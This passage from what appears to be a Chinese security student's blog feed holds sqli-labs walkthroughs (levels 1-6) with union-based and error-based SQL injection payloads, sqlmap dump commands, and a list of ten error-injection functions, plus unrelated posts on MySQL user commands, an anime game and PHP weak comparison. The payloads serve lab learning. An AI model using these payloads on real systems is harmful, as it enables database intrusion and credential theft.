mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;新密码&#x27;</span>;</span><br></pre></td></tr></table></figure><ol><li>删除用户</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>主机名可以用%通配</li><li>这类SQL开发人员操作的比较少，主要是DBA（Database Administrator）使用</li></ul><h3 id="DCL-权限控制"><a href="#DCL-权限控制" class="headerlink" title="DCL-权限控制"></a>DCL-权限控制</h3><p>Mysql中定义了很多种权限，但是常用的就以下几种：</p><p><img src="https://pic1.imgdb.cn/item/67eb8f540ba3d5a1d7e8fb26.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67eb8f8e0ba3d5a1d7e8fb75.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入学习</title>
      <link href="/2025/03/31/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/31/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Sql注入学习"><a href="#Sql注入学习" class="headerlink" title="Sql注入学习"></a>Sql注入学习</h1><p><strong>推荐文章：<a href="https://fushuling.com/index.php/2023/04/07/sql%e6%b3%a8%e5%85%a5%e4%b8%80%e5%91%bd%e9%80%9a%e5%85%b3/">https://fushuling.com/index.php/2023/04/07/sql%e6%b3%a8%e5%85%a5%e4%b8%80%e5%91%bd%e9%80%9a%e5%85%b3/</a></strong></p><blockquote><p><strong><code>Mastered</code></strong> <strong><code>---表示题目及知识点已熟练掌握😄</code></strong></p><p><strong><code>Pending</code></strong> <strong><code>---表示题目或知识点待掌握，需要花费时间进行熟悉⌚</code></strong></p><p><strong><code>Problematic</code></strong> <strong><code>---表示题目或知识点有问题，需要帮助😣</code></strong></p></blockquote><h2 id="Sqli-labs-less-1-Mastered"><a href="#Sqli-labs-less-1-Mastered" class="headerlink" title="Sqli-labs_[less-1] | Mastered"></a>Sqli-labs_[less-1] | Mastered</h2><p>判断注入点：</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQyYTUwNjhmZWZkZmNjMjBjZjE2ODI4MzRiMTczOTlfbVo0cVJpbHVnVk9kSXdpeUs0SlBkNTBNZ2R1OFNjNDNfVG9rZW46S3lmM2J1NmFPb29nV014ZWluOWNOOUJpbkJkXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>传入<code>?id=1&#39;</code>报错</p><p>加—+注释后有正常回显：</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ODA4N2JiNWQwYjUyNGM1MGY2Y2NjNTgxZmI3NmNkODJfdGplZHZCVldwZXYwWGZ0OW1QVXZCY2FWTzlKQzNyeWxfVG9rZW46TEptQmIzODFTb2FhbkJ4VkFxVWNmSWRQbkFoXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>说明存在注入。。首先使用order by判断字段数：</p><p>可以看到3是正常的，但是4报错：</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjAzZjI4YTQ0MTgwYTIyZjQyOTcyODBjMmMxMWQ2NmRfb1hEQ3oxZXFaaVQ2cEtoZFFybTdzbjhXN1hlbGhqNmxfVG9rZW46V1k4bmJTTm1ob25kQ3p4UW50RmNCZVBEbk1lXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjA4YWEzMzgyZjVmNWY0OTU4ZjVjNzExYzcwMTdkYjJfRUVuYlpMVEhFVUVpbFZxOGhib29SM2NWWFhMS1drM1NfVG9rZW46SEF1R2JvZDBZb1dqeHJ4Z0xPYmNLU2cwblJkXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>说明字段数为3</p><p>判断显示的信息点，通过id=-1来执行联合查询 <code>?id=-1``union select 1,2,3 --+</code></p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=OTJlZmUxZTE5YTE4MzA0MjZmM2MwYjJmMjc5ZjkwMzhfVjFGVWluMld0T1B6TkszSmU1Q29EOFo1cVN2b2VMbnhfVG9rZW46SnhodWJKRHZEb21ZOUx4NVFOd2MwOEJ0bm5kXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><ul><li><strong>常用查询信息</strong><ul><li>database() # 在用的数据库名</li><li>user()    # 用户信息</li><li>version() # 数据库版本信息</li><li>@@basedir # 数据库安装路径</li><li>@@version_compile_os # 操作系统版本</li></ul></li></ul><p>我们查看数据库的数据：</p><ol><li>查看表名：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=YjQ5YTBjMDUwMzJlMjQyYzUyYjY5YjllZWZjZGJhZDhfcWFqMlR6M0l3WjF6dk1PeVlTTVNwcVVOTTdXcXhhRlpfVG9rZW46WWp2dGJPT0xrb0VuSFd4TjFuVmN3Z1pIbm5kXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><ol><li>查看列名：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema =&#x27;sqlilabs&#x27; AND table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><ol><li>查看字段：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,group_concat(username SEPARATOR &#x27;-&#x27;),group_concat(password SEPARATOR &#x27;-&#x27;) FROM users --+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MTU1ZTk0NDU2ODRlZTc4M2UwMDI0ZjJjMWZjNTY2NGVfTXRaV09uamFFcVhLTjk3UG5IQ0ptUnVDTkdoR3JUSWRfVG9rZW46VlRvbGI0c0RKb0VQNW54Um1rUWNqRHlnblFjXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><h2 id="Sqli-labs-less-2-Mastered"><a href="#Sqli-labs-less-2-Mastered" class="headerlink" title="Sqli-labs_[less-2] | Mastered"></a>Sqli-labs_[less-2] | Mastered</h2><p>判断注入：</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MjIxZDAzZmMxNmFlZGUwZTA0Y2YzYTg4ODAyZGY2MGNfSzNjS2RIVXdMZW1nS3lxY0U2UUladDAxUDZuSXQ0eUhfVG9rZW46TTlRQmI2S2VRb0hJS2N4a1dPcGNFdU55bnRkXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>输入单引号报错，</p><p>加上and 1=1 页面正常：</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmRkZmUyMGYxNTY2NjcxOGUxYjMyYzk0NjJjM2M3ZDFfdTRNeGtJM1FUeUVSclBsZmN6NHZUR2U2S3BVVE9oYzVfVG9rZW46UFRkOWJSaml3b3hnZzd4N0VCb2NudmR2blRuXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>加上and 1=2 页面不正常:</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMxMWUxZjEyODE5ZWRhMmYzNGUxNzUxOWFhMmFmNjJfdHM1dDdhc1REUTIzWGtrODdyS1lSbWxhWklyUXZUVmVfVG9rZW46TFZkOGJqdkw3bzZkRkt4b3F4R2M4SUdUbjRkXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>说明执行了传入的payload，存在注入。</p><ol><li>判断字段数：</li></ol><p><code>http://localhost/sqlilabs2/Less-2/index.php?id=1`` order by 3--+</code> # 正常</p><p><code>http://localhost/sqlilabs2/Less-2/index.php?id=1`` order by 4--+</code> # 页面显示错误</p><p>说明字段数为3</p><ol><li>查询表名：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqlilabs2/Less-2/index.php?id=-1`` union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()--+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MGJjZGY4NzMxMGVlYjQ4MmYyYjgxZDk5YThiYmE3OTRfN0lCdzVwcmE1NHg3aGdFeUhjbEFpNE5rOTAzT0lHMUlfVG9rZW46RlV6Z2JyRzVJb2NpMTF4QlNJSmNjbk9QbnpkXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><ol><li>查询字段名：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqlilabs2/Less-2/index.php?id=-1`` union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI5OTBjYWY0N2Y0NjI4MGQxODA4NDM1NzFhOThkYmNfNnpMR05IOHdXcnlxVm5JcUxCTllRbDZucE5yVGc1ckhfVG9rZW46Tnh3TGJibjAybzdhMjZ4MTBjcmN5MWV0bjliXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><ol><li>直接查询数据库数据：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqlilabs2/Less-2/index.php?id=-1`` union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=M2ZjMDE2Zjc0N2YzNGZmY2JkZWFkMDQzMjY4MTdkZWRfVG9zZ3VJOVhNYnRoc2hKTWEyS3dqcGxtY3dldEc1bVBfVG9rZW46QzlQVWJ2ZzFXb2hMNTZ4cnE2eGNuRm5EbmliXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><h2 id="Sqli-labs-less-3-Mastered"><a href="#Sqli-labs-less-3-Mastered" class="headerlink" title="Sqli-labs_[less-3] | Mastered"></a>Sqli-labs_[less-3] | Mastered</h2><p>依旧判断注入点，发现存在。。</p><p><a href="http://localhost/sqlilabs2/Less-3/index.php?id=1">http://localhost/sqlilabs2/Less-3/index.php?id=1</a>‘) and 1=2 —+ # 报错</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTBmYzI2Zjk0ZjQ3NTk3NDJlMDgzMzI2MjMyMWE2ZjhfbGtYZWNYWVl1RWFITEp5Z3VNYTNQTXpYakhzZE0zM1dfVG9rZW46Q2EyWWJMSlhYb1huenp4MW9wZmNKbGpqbnJoXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p><a href="http://localhost/sqlilabs2/Less-3/index.php?id=1">http://localhost/sqlilabs2/Less-3/index.php?id=1</a>‘) and 1=1 —+ # 正常</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY1ZGNjMTQzMDQyNmE2ZWM5MzI3YTQ5YjRkN2QxNThfOEw3dGVSVUJ5d0dSUzN2NFl3UGdhQlVXYTdYbmk5M21fVG9rZW46V0N0YmJZWXJkb2s2RlZ4Y1UybWNlcGk5bnhoXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>提取数据库数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqlilabs2/Less-3/index.php?id=-1&#x27;``)`` union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDU0OTIxOTQ1YTBlNjBiZmIxY2U3OTlkNDUwM2I0NzlfRVZsSm16VDJueW9WMVNsWjc0VFJoV042cHBTVVp1QmpfVG9rZW46SDI5ZmJQdkZvb3FodkR4QVFIRWNFUnBGblRiXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><h2 id="Sqli-labs-less-4-Mastered"><a href="#Sqli-labs-less-4-Mastered" class="headerlink" title="Sqli-labs_[less-4] | Mastered"></a>Sqli-labs_[less-4] | Mastered</h2><p>存在注入点判断</p><p>加上双引号报错,发现存在”</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=NmNhYjhiYWIzNGMzMzgzNGQxNjEzZDNjMDM5YmZhMjhfRFF3UGhhaWpmdTJmM0dTUW4zVlQ0SHRZUHFBZlh2NURfVG9rZW46Ump5ZWJLN0xJb3JwUFV4UWMyR2NLUE5sbkZjXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p><a href="http://localhost/sqlilabs2/Less-4/index.php?id=1">http://localhost/sqlilabs2/Less-4/index.php?id=1</a>“) and 1=2 —+ # 报错</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MzBiZTQ5YmE2MzJlYmQwYjhiYTY2ZDkzOWUzYTdkZjFfc2RBWXJjU0tJVzhoNFNlTHU1a0JMbGVkaUFBYnE2RURfVG9rZW46TGpleGJLZWFQb0ZVQkR4VmowcWNxRFBqbmdjXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p><a href="http://localhost/sqlilabs2/Less-4/index.php?id=1">http://localhost/sqlilabs2/Less-4/index.php?id=1</a>“) and 1=1 —+ # 正常</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc5NjY0NWJkOWE0OWI1ZjE3NGY4NWYyNGVmZTAyZWNfMktDV2FQaVlsck81ZWpzR0Z6SVA0YmM4RlBDOHRFanpfVG9rZW46WGhxMmI2SUdtb0prZWp4SVB4MmN4NHJEbnFnXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>直接上payload,将数据库脱出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``http://localhost/sqlilabs2/Less-4/index.php?id=-1``&quot;) union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ODE4OTViMjM4NTVkNTI3OTBlNGFjZjlmNTU3YTFjMTdfQjYxRVF0UDBoNHZJUXJSRVI5M2hjVmJzcGQ3SFRHUHFfVG9rZW46SnJVcmJTdUE4bzRWMHV4T29QRWN1cnQ2bjdjXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><h2 id="使用Sqlmap对less-1-4的解题："><a href="#使用Sqlmap对less-1-4的解题：" class="headerlink" title="使用Sqlmap对less 1-4的解题："></a>使用Sqlmap对less 1-4的解题：</h2><h2 id="SQLmap常规用法"><a href="#SQLmap常规用法" class="headerlink" title="SQLmap常规用法"></a>SQLmap常规用法</h2><p>1、检测「注入点」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘</p><p>2、查看所有「数据库」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —dbs</p><p>3、查看当前使用的数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —current-db</p><p>4、查看「数据表」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ —tables</p><p>5、查看「字段」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ —tables</p><p>6、查看「数据」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ —dump</p><p>对于less 1-4，可以用以下payload:</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://localhost/sqlilabs2/Less-2/index.php?id=1``&quot; --batch -D security -T users --columns --dump</span><br></pre></td></tr></table></figure><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDY5NDRhZjBhMTYzMzA4ZDZjYzNjYzU0MzIzNWY0YmVfcXFTUGo5ZTdOSUloUkd4M1RpQmFzUHdubWZGNWRVd1dfVG9rZW46UFlsSGJWRzNzb0JlQjh4RXZPNWNHSDB1bmNmXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzg5NTU2ZWNlOGE2ZjE1ODM2NGNmNDZkNzM5OTA3YzVfZ1gzdnE5MDkzUEd2cE9ESTV2THhQb0FwR2FaOUlFZWZfVG9rZW46RUR2U2JkTUNmb01Tc0J4amNDUGNsNGk4bnloXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><h2 id="Sqli-labs-less-5-Mastered"><a href="#Sqli-labs-less-5-Mastered" class="headerlink" title="Sqli-labs_[less-5] | Mastered"></a>Sqli-labs_[less-5] | Mastered</h2><p><strong>存在注入点判断</strong></p><ol><li>输入单引号测试，有报错信息，返回信息和第一关错误信息一样</li><li>不管输入id为多少，页面一直都是 you are in ….猜测正确的页面不变，不会将查询结果打印到页面了</li></ol><p><strong>但是会把错误的信息给打印出来..</strong></p><p>因此，应当使用的是<strong>报错注入</strong>：</p><p><strong>报错注入方式（十种）</strong></p><p><strong>floor函数注入</strong>  </p><p><strong>写法：</strong>select <em> from test where id=1 and (select 1 from (select count(</em>),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); </p><p><strong>运用：</strong> <a href="http://localhost/sqlilabs2/Less-5/index.php?id=-1">http://localhost/sqlilabs2/Less-5/index.php?id=-1</a>‘ union select 1,count(<em>),concat((floor(rand(0)</em>2)),’—‘,(select  concat(id,’-‘,username,’-‘,password) from security.users limit 0,1))x  from information_schema.tables group by x%23</p><p><strong>注意：</strong></p><ul><li>payload是在中间concat部分，修改该部分可以执行不同命令</li><li>只能用concat连接 ，group_concat不行，且每次只能显示一条数据</li><li>要让上述的报错实现，数据库至少要3条数据</li><li>count():查询数量</li><li>rand()：产生0~1间的随机数</li><li>floor()：向下取整</li><li>group by：按指定分类</li></ul><p><strong>updatexml函数注入</strong></p><p>写法：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p><p>运用：<a href="http://localhost/sqlilabs2/Less-5/index.php?id=-1">http://localhost/sqlilabs2/Less-5/index.php?id=-1</a>‘ and  (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12)  from users),0x7e),1))—+</p><p>注意：</p><ul><li>MySQL 5.1.5版本以上才支持该函数</li><li>返回的数据限制为32位</li><li>可以用substring函数进行数据位移偏转</li><li>对XML文档进行修改</li><li>UPDATEXML (XML_document, XPath_string, new_value);</li></ul><p>第一个参数：XML_document是String格式，为XML文档对象的名称</p><p>第二个参数：XPath_string (Xpath格式的字符串)</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><ul><li>作用：改变文档中符合条件的节点的值</li></ul><p><strong>geometrycollection函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and geometrycollection((select </em> from(select * from(select user())a)b));</li></ul><p><strong>multipoint函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and multipoint((select </em> from(select * from(select user())a)b));</li></ul><p><strong>polygon函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and polygon((select </em> from(select * from(select user())a)b));</li></ul><p><strong>multipolygon函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and multipolygon((select </em> from(select * from(select user())a)b));</li></ul><p><strong>linestring函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and linestring((select </em> from(select * from(select user())a)b));</li></ul><p><strong>multilinestring函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and multilinestring((select </em> from(select * from(select user())a)b));</li></ul><p><strong>exp函数注入</strong></p><ul><li>写法 select <em> from test where id=1 and exp(~(select </em> from(select user())a));</li></ul><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzc1OTk4ZjFjYTI1MWRkYzFkZTk1OGEyNzdmOTY1YmJfNFB6N0h6cXZ2Y0lmUHg1ZUZPMnJNMlJzcVY1M3ZiNUpfVG9rZW46SjJhbmI2MXhGbzJUc3V4S0tYU2NJZHV3bnhjXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p>或：</p><p>使用sqlmap:</p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFlOGJlNTQ1MTFmYmE2NDY1Njg2OTE1NTg1NzgyZTRfZ0xBdEZGUE9qME9TY09uUUJ0ZXVrdWVxZXdHV1N5QXlfVG9rZW46RnVldmJvVmxib3JMNE94OU51NmNCRUw3bkJjXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><p><img src="https://pcnyy8dtuhg5.feishu.cn/space/api/box/stream/download/asynccode/?code=MWE4MDhmNmIwNTcyMjRhYjg1ODA4OTZhMGY5ZTZhZWRfcjlTenZFMHo0WVY3NUhEOEdhMFQxaWNwTVFFM2g5UGdfVG9rZW46SkFFa2JsSnJDb0lqM254NlMyb2NxWW1NblhnXzE3NDM2NjgxMjY6MTc0MzY3MTcyNl9WNA" alt="img"></p><h2 id="Sqli-labs-less-6-Mastered"><a href="#Sqli-labs-less-6-Mastered" class="headerlink" title="Sqli-labs_[less-6] | Mastered"></a>Sqli-labs_[less-6] | Mastered</h2>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于“魔法少女まどか☆マギカ Magia Exedra”</title>
      <link href="/2025/03/23/%E9%AD%94%E5%9C%86%E6%B8%B8%E6%88%8F/"/>
      <url>/2025/03/23/%E9%AD%94%E5%9C%86%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="魔法少女まどか☆マギカ-Magia-Exedra"><a href="#魔法少女まどか☆マギカ-Magia-Exedra" class="headerlink" title="魔法少女まどか☆マギカ Magia Exedra"></a>魔法少女まどか☆マギカ Magia Exedra</h1><p>自从看过魔圆后我已经深深迷恋上了这个番，虽然番本身很老了，但最近看完依旧觉得是无法超越的神作！</p><p>据说游戏Magia Exedra将在2025.3.27上线</p><p>狠狠地期待一波</p><p>今天部门培训，浅浅做个海报……</p><p><img src="https://pic1.imgdb.cn/item/67e0121288c538a9b5c520d8.png" alt=""></p><p><code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code></p><p>小圆真的太可爱了！！！</p><p><img src="https://pic1.imgdb.cn/item/67e0127788c538a9b5c520f1.jpg" alt=""></p><p><strong>期待游戏上线！！！！</strong></p><p>◆简介◆</p><p> 漂浮在黑暗中，点亮魔法少女们记忆的地方。 </p><p>《灯塔剧场》 徘徊的却是一个失去一切的“女孩”。</p><p> “我是谁?” “我发生什么事了？” </p><p>“少女”打开记忆之窗，体验无数魔法少女的记忆。 相信那里面有你自己失去的记忆之光…… </p><p>◆3D完整再现《魔法少女小圆》的世界◆ </p><p>同系列的魔法少女登场，可以通过ADV重温TV动画《魔法少 女小圆》、应用游戏《魔法记录：魔法少女小圆外传》等各种场 景。 </p><p>◆探索魔女结界◆ </p><p>操作角色探索魔女结界，收集魔法少女记忆中的灯光和物品。 您可以享受《魔女结界》特有的噱头和空间设计。 </p><p>◆通过命令选择进行战斗◆</p><p> 您最多可以组织 5 名魔法少女，并根据简单的命令选择展开 战斗。 魔法少女根据其类型具有兼容性，并且还有一个破坏系统，可 以减少敌人的破坏量表，并根据其优势属性提供额外的效果， 女巫和她的爪牙们将展开一场高度战略性且激烈的战斗。 </p><p>◆Staff◆ </p><p>企划发行：Aniplex </p><p>开发：PokeLab/f4samurai </p><p>管理：PokeLab </p><p>◆声优登场◆ </p><p>悠纪葵、齐藤千和、水桥香织、北村绘里、野中爱、加藤英美里 朝仓桃、雨宫空、夏川椎名、佐仓绫音、小仓唯、岩见真中</p><p>——摘自TapTap游戏简介</p>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web周报03</title>
      <link href="/2025/03/20/web%E5%91%A8%E6%8A%A503/"/>
      <url>/2025/03/20/web%E5%91%A8%E6%8A%A503/</url>
      
        <content type="html"><![CDATA[<h1 id="Web周报03"><a href="#Web周报03" class="headerlink" title="Web周报03"></a>Web周报03</h1><p><strong><em>【黑夜无论怎样悠长，白昼总会到来。             ——莎士比亚】</em></strong></p><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="php弱比较"><a href="#php弱比较" class="headerlink" title="php弱比较"></a>php弱比较</h3><p>在 PHP 中，弱比较是指在比较两个不同类型的值时，PHP 会尝试将它们转换为相同的类型，然后再进行比较。这种类型转换可能导致一些意想不到的行为，因此了解弱比较的规则对于编写安全的 PHP 代码非常重要。</p><h4 id="常见的弱比较场景"><a href="#常见的弱比较场景" class="headerlink" title="常见的弱比较场景"></a>常见的弱比较场景</h4><h5 id="1-字符串和数字比较"><a href="#1-字符串和数字比较" class="headerlink" title="1. 字符串和数字比较"></a>1. 字符串和数字比较</h5><p>当一个字符串和一个数字进行比较时，PHP 会将字符串转换为数字。如果字符串的开头部分是数字，PHP 会使用这些数字进行比较；如果字符串不以数字开头，则会被转换为 0。</p><p><strong>示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;123abc&quot;</span> == <span class="number">123</span>); <span class="comment">// true，因为 &quot;123abc&quot; 被转换为 123</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;abc123&quot;</span> == <span class="number">0</span>);   <span class="comment">// true，因为 &quot;abc123&quot; 被转换为 0</span></span><br></pre></td></tr></table></figure><h5 id="2-布尔值比较"><a href="#2-布尔值比较" class="headerlink" title="2. 布尔值比较"></a>2. 布尔值比较</h5><p>当布尔值与其他类型比较时，PHP 会将其他类型转换为布尔值。非零数字和非空字符串会被转换为 <code>true</code>，而 0、空字符串、<code>null</code> 等会被转换为 <code>false</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="number">1</span>);       <span class="comment">// true，因为 1 转换为 true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">false</span> == <span class="number">0</span>);      <span class="comment">// true，因为 0 转换为 false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="string">&quot;abc&quot;</span>);   <span class="comment">// true，因为 &quot;abc&quot; 转换为 true</span></span><br></pre></td></tr></table></figure><h5 id="3-数组比较"><a href="#3-数组比较" class="headerlink" title="3. 数组比较"></a>3. 数组比较</h5><p>当数组与其他类型比较时，如果另一个类型不是数组，则数组会被视为 <code>true</code>。因此，数组与非数组比较时，通常会得到 <code>false</code>，除非另一个类型是 <code>true</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>() == <span class="literal">false</span>); <span class="comment">// true，因为空数组被视为 false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>(<span class="number">1</span>) == <span class="literal">true</span>); <span class="comment">// true，因为非空数组被视为 true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>() == <span class="number">0</span>);     <span class="comment">// false，因为数组和数字比较时，数组被视为 true</span></span><br></pre></td></tr></table></figure><h4 id="PHP-弱比较的具体规则"><a href="#PHP-弱比较的具体规则" class="headerlink" title="PHP 弱比较的具体规则"></a>PHP 弱比较的具体规则</h4><h5 id="1-比较运算符"><a href="#1-比较运算符" class="headerlink" title="1. 比较运算符 